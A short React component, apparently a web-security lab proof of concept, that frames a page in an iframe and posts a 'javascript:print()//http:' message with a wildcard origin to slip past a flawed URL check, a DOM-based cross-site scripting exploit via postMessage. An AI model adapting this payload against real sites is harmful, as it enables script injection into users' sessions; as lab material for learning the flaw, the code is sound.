'use client';

export default function Exploit() {
  function sendExploit() {
    const iframe = document.getElementById('exploit-iframe');
    // The target origin is set to '*' to allow the message to be sent to any domain.
    // The payload is a javascript URI that will execute the print() function.
    // The 'http:' string is included to bypass the flawed check in the parent page.
    iframe.contentWindow.postMessage('javascript:print()//http:', '*');
  }

  return (
    <div>
      <h1>Exploit Page</h1>
      <iframe id="exploit-iframe" src="/" onLoad={sendExploit}></iframe>
    </div>
  );
}
